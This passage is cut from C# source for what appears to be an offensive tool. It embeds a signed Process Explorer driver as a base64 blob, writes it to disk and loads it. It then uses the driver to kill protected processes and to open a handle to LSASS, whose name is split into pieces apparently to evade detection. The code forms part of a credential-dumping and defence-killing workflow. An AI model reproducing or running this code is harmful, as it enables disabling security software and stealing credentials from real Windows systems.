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");
           //driver64 = File.ReadAllBytes(@"procexp64.sys");
            
            
            IntPtr data = Marshal.AllocHGlobal(driver64.Length);
            Marshal.Copy(driver64, 0, data, driver64.Length);
            if (POSTMiniDump.Utils.WriteFile(diskfile, data, driver64.Length, out IntPtr hFile))
            {
                Console.WriteLine("[+] Driver written to disk");
                CloseHandle(hFile);
            }

            if (!LoadDriver(diskfile, ServiceName))
            {
                Console.WriteLine("Try to load driver using \"procexp64.exe -accepteula /t\"");
                UnLoadDriver(diskfile, ServiceName);
                DeleteDiskDriver(diskfile);
                return;
            }
            
            if (!GetDriverHandle(drvname, out hDriver))
            {
                UnLoadDriver(diskfile, ServiceName);
                DeleteDiskDriver(diskfile);
                return;
            }

            if ((int)pid > 0)
            {
                
                if (GetProtectedProcessHandle(hDriver, pid, out hProtectedProcess))
                {
                    if (KillProcessHandles(hProtectedProcess, hDriver, pid))
                    {
                        Console.WriteLine("[+] Process " + pid + " successfully killed!");
                    }
                }
                
            }

            if (GetLsassHandle)
            {
                Process lproc = Process.GetProcessesByName("l" + "sa" + "ss")[0];
                pid = lproc.Id;

                GetProtectedProcessHandle(hDriver, pid, out hProtectedProcess);
            }

            UnLoadDriver(driverPath, ServiceName);
            CloseHandle(hDriver);
            DeleteDiskDriver(diskfile);

            return;

        }
    }
}
